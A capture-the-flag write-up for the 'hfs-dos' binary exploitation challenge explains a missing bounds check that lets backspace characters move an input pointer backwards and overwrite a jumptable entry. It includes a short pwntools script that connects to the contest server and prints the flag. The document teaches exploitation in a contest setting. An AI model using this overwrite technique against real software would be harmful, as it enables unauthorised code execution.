# hfs-dos

**Category**: pwn
**Authors**: @viktoredstrom, @n00byedge

---

We're prompted with a very basic shell with the following commands implemented: ping, pong, vers, myid and exit (every command besides the later just printing out dummy strings). Which function should be executed given some input is implemented as a jumptable:

![jumptable](img/jmp.png?raw=true)

The program stores input one character at the time inside a buffer, and if four characters are read the read pointer is reset to its original position. However we're also able to "delete" characters in our input i.e move said pointer backwards, and there's no lower-bound check. So we're able to overwrite anything which happens to be before our input buffer.

![jumptable](img/no-check.png?raw=true)
![jumptable](img/buf.png?raw=true)
(inputBuf is initially set to 0x39C)

From here on:
1. Turn "FLAG1" into "FLAG2"
2. Overwrite some function pointer inside the jumptable with the program entry (0x174).
3. Execute command

## Solution

```python
from pwn import *
sock = remote('hfs-os-01.play.midnightsunctf.se', 31337)
sock.readuntil('[HFS_MBR]>') ; sock.send('sojupwner\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('\x7f' * 11 + '\x74\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('\x7f' * 3 + '2\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('pong')
sock.interactive()
```

It's almost comical how small the solution is, `midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}`
